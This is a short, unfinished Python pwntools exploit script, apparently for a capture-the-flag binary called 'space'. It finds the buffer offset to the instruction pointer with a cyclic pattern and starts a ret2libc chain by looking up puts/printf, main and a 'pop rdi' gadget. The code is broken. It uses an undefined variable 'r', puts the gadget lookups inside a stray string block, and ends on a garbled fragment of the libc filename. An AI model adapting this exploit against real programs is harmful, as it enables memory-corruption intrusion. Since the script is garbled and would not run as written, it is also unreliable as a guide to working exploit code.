#!/bin/python3
from pwn import *
import struct

LOCAL = True
GDB = True

local_bin = "../space"
libc = "../libc6-i386_2.27-3ubuntu1_amd64.so"


p = process(local_bin) # start binary
elf = ELF(local_bin) # binary data
rop = ROP(elf) # find ROPs

#if GDB:
#    gdb.attach(p.pid, "continue")

#OFFSET = "A" * 18 # distance from buffer start to EIP
OFFSET = "" # distance from buffer start to EIP
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    cyclic_find(0x6161616b) # Find the offset of those bytes
"""

try:
    PUTS_PLT = elf.plt['puts']
except:
    PUTS_PLT = elf.plt['printf']

MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]untu1_amd64.so
"""
